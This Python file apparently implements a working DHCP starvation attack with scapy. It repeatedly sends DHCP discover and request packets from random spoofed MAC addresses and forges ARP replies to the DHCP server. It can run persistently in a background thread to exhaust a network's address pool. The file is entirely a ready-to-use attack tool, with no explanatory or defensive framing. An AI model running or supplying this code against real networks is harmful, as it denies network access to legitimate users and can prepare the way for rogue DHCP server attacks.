import random
import threading
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP

is_running = False
starve_thread = None


def dhcp_discover(spoofed_mac, xid, i_face):
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    dsc = Ether(src=spoofed_mac, dst=mac_dest)
    dsc /= IP(src='0.0.0.0', dst=ip_dest)
    dsc /= UDP(sport=68, dport=67)
    dsc /= BOOTP(chaddr=mac2str(spoofed_mac), xid=xid, flags=0x8000)
    dsc /= DHCP(options=[("message-type", "discover"), "end"])
    sendp(dsc, iface=i_face, verbose=False)
    print("[+] Discover sent")


def dhcp_request(req_ip, spoofed_mac, server_ip, xid, i_face):
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    req = Ether(src=spoofed_mac, dst=mac_dest)
    req /= IP(src="0.0.0.0", dst=ip_dest)
    req /= UDP(sport=68, dport=67)
    req /= BOOTP(chaddr=mac2str(spoofed_mac), xid=xid)
    req /= DHCP(
        options=[("message-type", "request"),
                 ("server_id", server_ip),
                 ("requested_addr", req_ip),
                 "end"])
    sendp(req, iface=i_face, verbose=False)
    print('[+] Request sent')


def arp_reply(src_ip, source_mac, server_ip, server_mac, i_face):
    reply = ARP(op=2, hwsrc=mac2str(source_mac), psrc=src_ip, hwdst=server_mac, pdst=server_ip)
    send(reply, iface=i_face, verbose=False)


def _starve_loop(target_ip, i_face, persistent):
    global is_running
    server_mac = None

    if target_ip:
        try:
            ans = sr1(ARP(op=1, pdst=str(target_ip)), timeout=2, verbose=False)
            if ans:
                server_mac = ans[ARP].hwsrc
        except Exception:
            pass

    while is_running:
        counter = 0
        mac = str(RandMAC())
        xid = random.randint(1, 1000000000)
        dhcp_discover(spoofed_mac=mac, xid=xid, i_face=i_face)

        offered_ip = None
        server_ip = None

        while is_running:
            # Filter specifically for our transaction ID and a DHCP Offer message type (2)
            packets = sniff(
                count=1,
                filter="udp and (port 67 or 68)",
                timeout=3,
                iface = i_face,
                lfilter=lambda p: DHCP in p and p[BOOTP].xid == xid and any(
                    opt[0] == 'message-type' and opt[1] == 2 for opt in p[DHCP].options if isinstance(opt, tuple)
                )
            )

            if not is_running:
                break

            if not packets:
                if not persistent and counter >= 3:
                    print("[-] Finishing attack loop (no replies)")
                    return
                counter += 1
                dhcp_discover(spoofed_mac=mac, xid=xid, i_face=i_face)
                continue

            p = packets[0]
            offered_ip = p[BOOTP].yiaddr
            server_ip = p[IP].src
            break

        if not is_running or not offered_ip:
            continue

        target_server = target_ip if target_ip else server_ip

        if not server_mac and target_server:
            try:
                ans = sr1(ARP(op=1, pdst=str(target_server)), timeout=2, verbose=False)
                if ans:
                    server_mac = ans[ARP].hwsrc
            except Exception:
                pass

        dhcp_request(req_ip=offered_ip, spoofed_mac=mac, server_ip=target_server, xid=xid, i_face=i_face)
        if server_mac:
            arp_reply(src_ip=offered_ip, source_mac=mac, server_ip=target_server, server_mac=server_mac, i_face=i_face)


def start_starve(target_ip=0, i_face=conf.iface, persistent=False):
    global is_running, starve_thread
    is_running = True
    starve_thread = threading.Thread(
        target=_starve_loop,
        args=(target_ip, i_face, persistent),
        daemon=True
    )
    starve_thread.start()
    print(f"[*] DHCP Starvation running against target: {target_ip or 'Auto'}")
    input("Press Enter to stop...\n")
    stop_starve()


def stop_starve():
    global is_running
    is_running = False
    print("[+] DHCP Starvation stopped.")